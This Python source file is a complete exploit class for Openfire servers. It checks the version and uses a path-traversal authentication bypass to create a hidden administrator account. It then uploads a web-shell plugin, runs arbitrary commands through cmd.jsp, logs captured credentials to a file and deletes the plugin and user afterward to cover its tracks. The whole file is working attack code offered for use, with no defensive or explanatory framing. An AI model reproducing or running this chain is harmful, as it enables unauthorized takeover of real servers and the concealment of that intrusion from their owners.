import re
import time
from core.exploit import *
from core.utils import *
import HackRequests


def generate_random_string(length):
    charset = string.ascii_lowercase + string.digits
    return ''.join(random.choice(charset) for _ in range(length))

def between(string, starting, ending):
    s = string.find(starting)
    if s < 0:
        return ""
    s += len(starting)
    e = string[s:].find(ending)
    if e < 0:
        return ""
    return string[s : s+e]

final_result = []


class OpenFire(Exploit):
    versions = [
        "3.10.0", "3.10.1", "3.10.2", "3.10.3",
        "4.0.0", "4.0.1", "4.0.2", "4.0.3", "4.0.4", 
        "4.1.0", "4.1.1", "4.1.2", "4.1.3", "4.1.4", "4.1.5", "4.1.6", 
        "4.2.0", "4.2.1", "4.2.2", "4.2.3", "4.2.4", 
        "4.3.0", "4.3.1", "4.3.2", 
        "4.4.0", "4.4.1", "4.4.2", "4.4.3", "4.4.4", 
        "4.5.0", "4.5.1", "4.5.2", "4.5.3", "4.5.4", "4.5.5", "4.5.6", 
        "4.6.0", "4.6.1", "4.6.2", "4.6.3", "4.6.4", "4.6.5", "4.6.6", "4.6.7", 
        "4.7.0", "4.7.1", "4.7.2", "4.7.3", "4.7.4"
    ]

    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = ""
        self.csrf = ""
        self.plugin_csrf = ""
        self.sessionid = ""
        self.username = ""
        self.password = ""

    def ckversion(self):
        r = self.client.request("GET", "/index.jsp")
        pattern = re.compile(r"Openfire, Version: \d+\.\d+\.\d+")
        groups = re.search(pattern, r.text)
        if groups:
            ver = groups.group(0).split(":")[1].strip()
            if ver in self.versions:
                self.log("Version: " + ver, "info")
                return True
            self.log("Don't support version: " + ver, "info")
        return False
    
    def upload(self):
        if self.ckversion() and self.create_user() and           \
            self.login() and                \
            self.plugin() and               \
            self.upload_plugin() and        \
            self.login_plugin():
            return ExploitStatus.SUCCESS
        return ExploitStatus.FAILED
            
    def create_user(self):
        # setup 1: get csrf + jsessionid
        jsessionid = ""
        csrf = ""

        try:
            uri = f"/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Accept-Language": "q=0.8,en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.2.3.4",
                "Upgrade-Insecure-Requests": "1"
            }
            self.log("Checking target", "info")
            hack = HackRequests.hackRequests()
            hh = hack.http(self.url+uri, headers=headers)
            jsessionid = hh.cookies.get('JSESSIONID', '')
            csrf = hh.cookies.get('csrf', '')

            if jsessionid != "" and csrf != "":
                self.log("Successfully retrieved sessionid and csrf", "info")
            else:
                self.log("Failed to get sessionid and csrf value", "error")
                return False
            
            # setup 2: add user
            username = generate_random_string(6)
            password = generate_random_string(6)
            
            header2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Cookie": f"JSESSIONID={jsessionid}; csrf={csrf}",
                "Accept-Language": "en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.2.3.4",
                "Upgrade-Insecure-Requests": "1"
            }

            create_user_url= f"/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={username}&name=&email=&password={password}&passwordConfirm={password}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
            hhh = hack.http(self.url+create_user_url, headers=header2)

            if hhh.status_code == 200:
                self.log(f"User added successfully, username: {username} password: {password}", "info")
                self.username = username
                self.password = password
                self.sessionid = jsessionid
                self.csrf = csrf
                with open("success.txt", "a+") as f:
                    f.write(f"url: {self.url} username: {username} password: {password}\n")
                return True
            else:
                self.log("Failed to add user", "error")
                return False
            
        except Exception as e:
            self.log(f"Error occurred while retrieving cookies: {e}", "error")
        return False

    def upload_plugin(self):        
        uri = "/plugin-admin.jsp?uploadplugin&csrf={}".format(self.csrf)
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": self.url,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/plugin-admin.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, self.csrf)
        }
        files = [
            ("uploadfile", ("openfire-management-tool-plugin.jar", open("lib/openfire-management-tool-plugin.jar", "rb"), "application/octet-stream"))
        ]

        response = self.client.request("POST", uri, headers=headers, files=files)
        if response.status_code == 200:
            self.plugin_csrf = response.cookies.get("csrf")
            self.log("Plugin uploaded successfully", "info")
            return True
        self.log("Plugin upload failed", "error")
        return False

    def login_plugin(self, password="123"):
        uri = "/plugins/openfire-management-tool-plugin/cmd.jsp"
        data = "__EVENTTARGET=&__EVENTARGUMENT=&password={}&Button=Login".format(password)
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "null",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, self.plugin_csrf)
        }
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            self.log("Login plugin successful", "info")
            return True
        
        uri = "/plugins/management/cmd.jsp"
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            self.log("Login plugin successful", "info")
            return True
        
        self.log("Login plugin failed", "error")
        return False
    
    def attack(self, cmd):
        uri = "/plugins/openfire-management-tool-plugin/cmd.jsp?action=command"
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "null",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, self.plugin_csrf)
        }

        cmd = cmd.replace(" ", "+")
        data = "command={}".format(cmd)
        response = self.client.request("POST", uri, headers=headers, data=data, timeout=(8.0, 60.0*10))
        if response.status_code == 200:
            if b'<table align="center" width="600" border="0">' in response.content:
                pattern = re.compile(r'<tr>(.*?)</tr>', re.DOTALL)
                result = re.search(pattern, response.text)
                if result:
                    self.log("Command execution successful", "info")
                    return result.group(0).replace("<tr>", "").replace("</tr>", "").replace("<td>", "").replace("</td>", "").replace("&nbsp;", " ").strip().encode()
        
        uri = "/plugins/management/cmd.jsp?action=command"
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            if b'<table align="center" width="600" border="0">' in response.content:
                pattern = re.compile(r'<tr>(.*?)</tr>', re.DOTALL)
                result = re.search(pattern, response.text)
                if result:
                    self.log("Command execution successful", "info")
                    return result.group(0).replace("<tr>", "").replace("</tr>", "").replace("<td>", "").replace("</td>", "").replace("&nbsp;", " ").strip().encode()
                
        self.log("Command execution failed", "error")
        return b"error"

    def exit_plugin(self):
        uri = "/plugins/openfire-management-tool-plugin/cmd.jsp?action=exit"
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "null",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, self.plugin_csrf)
        }
        response = self.client.request("GET", uri, headers=headers)
        if response.status_code == 200:
            self.log("Exit plugin program", "info")
            return

        uri = "/plugins/management/cmd.jsp?action=exit"
        response = self.client.request("GET", uri, headers=headers)
        if response.status_code == 200:
            self.log("Exit plugin program", "info")

    def login(self, username="", password=""):
        if username == "" and password == "":
            username = self.username
            password = self.password
        else:
            self.username = username
            self.password = password
        csrf = randstr(15)
        if self.sessionid == "":
            sessionid = "node0euvzohjk5w9y1u3cjendkk03i163.node0"
        else:
            sessionid = self.sessionid
        uri = "/login.jsp"
        headers = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": self.url,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/login.jsp",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(sessionid, csrf)
        }
        data = "login=true&csrf={}&username={}&password={}".format(csrf, username, password)
        response = self.client.request("POST", uri, data=data, headers=headers, allow_redirects=False)
        
        if response.status_code == 302 or response.status_code == 200:
            try:
                cookies = response.cookies.get_dict()
                csrf = cookies["csrf"]
                sessionid = cookies["JSESSIONID"]
            except:
                self.log("Failed to get sessionid", "error")
                return False
            self.csrf = csrf
            self.sessionid = sessionid
            self.log("Login successful", "info")
            return True
        self.log("Login failed", "error")
        return False

    def index(self):
        uri = "/index.jsp"
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/login.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; csrf={}; JSESSIONID={}".format(self.csrf, self.sessionid),
        }
        response = self.client.request("GET", uri, headers=headers)
        if response.status_code == 200:
            return True
        return False
    
    def plugin(self):
        uri = "/plugin-admin.jsp"
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/index.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; csrf={csrf}; JSESSIONID={sessionid}".format(csrf=self.csrf, sessionid=self.sessionid)
        }

        response = self.client.request("GET", uri, headers=headers)
        if response.status_code == 200:
            cookies = response.cookies.get_dict()
            self.csrf = cookies.get("csrf")
            self.log("Navigate to the plugin page", "info")
            return True
        return False
    
    def user_summary(self):
        uri = "/user-summary.jsp"
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/index.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; csrf={}; JSESSIONID={}".format(self.csrf, self.sessionid)
        }

        response = self.client.request("GET", uri, headers = headers)
        if response.status_code == 200:
            self.log("Navigate to the user page", "info")
            return True
        return False
    
    def delete_user(self):
        uri = "/user-delete.jsp?username={}".format(self.username)
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/user-summary.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; csrf={}; JSESSIONID={}".format(self.csrf, self.sessionid)
        }
        response = self.client.request("GET", uri, headers=headers)
        if response.status_code != 200:
            self.log("Failed to navigate to the user page", "error")
            return False
        
        cookies = response.cookies.get_dict()
        csrf = cookies.get("csrf")
        self.log("Navigate to the user page", "info")
        
        uri = "/user-delete.jsp?csrf={}&username={}&delete=Delete+User".format(csrf, self.username)
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/user-delete.jsp?username={}".format(self.username),
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, csrf)
        }

        response = self.client.request("GET", uri, headers=headers)
        if response.status_code == 200 or response.status_code == 500:
            self.log("Delete user successfully", "info")
            return True
        return False
            
    def delete_plugin(self):
        uri = "/plugin-admin.jsp?csrf={csrf}&deleteplugin=openfire-management-tool-plugin".format(csrf=self.csrf)
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": self.url + "/plugin-admin.jsp",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={sessionid}; csrf={csrf}".format(sessionid=self.sessionid, csrf=self.csrf)
        }
        response = self.client.request("GET", uri, headers = headers)
        if response.status_code == 200:
            self.log("Delete plugin successfully", "info")
            return True
        return False
    
    def clean(self):
        self.exit_plugin()
        self.delete_plugin()
        time.sleep(1)
        self.delete_user()

    def attack_large(self, cmd):
        uri = "/plugins/openfire-management-tool-plugin/cmd.jsp?action=command"
        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "null",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": "is_cisco_platform=-1; startupapp=neo; JSESSIONID={}; csrf={}".format(self.sessionid, self.plugin_csrf)
        }

        cmd = cmd.replace(" ", "+")
        data = "command={}".format(cmd)
        response = self.client.requestlargedata("POST", uri, headers=headers, data=data, timeout=(8.0, 60.0*10))
        if response.status_code == 200:
            if b'<table align="center" width="600" border="0">' in response.content:
                pattern = re.compile(r'<tr>(.*?)</tr>', re.DOTALL)
                result = re.search(pattern, response.text)
                if result:
                    self.log("Command execution successful", "info")
                    return result.group(0).replace("<tr>", "").replace("</tr>", "").replace("<td>", "").replace("</td>", "").replace("&nbsp;", " ").strip().encode()
        
        uri = "/plugins/management/cmd.jsp?action=command"
        response = self.client.requestlargedata("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            if b'<table align="center" width="600" border="0">' in response.content:
                pattern = re.compile(r'<tr>(.*?)</tr>', re.DOTALL)
                result = re.search(pattern, response.text)
                if result:
                    self.log("Command execution successful", "info")
                    return result.group(0).replace("<tr>", "").replace("</tr>", "").replace("<td>", "").replace("</td>", "").replace("&nbsp;", " ").strip().encode()
                
        self.log("Command execution failed", "error")
        return b"error"

